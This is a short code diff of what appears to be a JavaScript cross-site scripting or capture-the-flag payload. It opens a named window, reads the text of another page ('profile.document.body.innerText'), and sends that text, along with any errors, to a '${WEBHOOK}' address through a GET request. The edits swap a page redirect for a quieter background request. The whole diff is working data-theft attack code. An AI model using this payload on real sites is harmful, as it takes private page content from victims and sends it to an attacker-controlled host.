@@ -17,8 +17,8 @@ function post(url, data) {
 }
 
 function imgEnd() {
-  get(WEBHOOK + "?end");
-  document.location.href = WEBHOOK;
+  window.open(PROFILE, "toto");
+  // document.location.href = WEBHOOK;
 }
 
 // const queryString = window.location.search;
@@ -36,9 +36,8 @@ function get(url) {
 }
 
 try {
-  get("${WEBHOOK}?" + "profile");
   const profile = window.open("", "${OPEN}");
-  window.location = "${WEBHOOK}?" + profile.document.body.innerText;
+  get("${WEBHOOK}?" + profile.document.body.innerText);
 } catch (error) {
   get("${WEBHOOK}?" + error);
 }
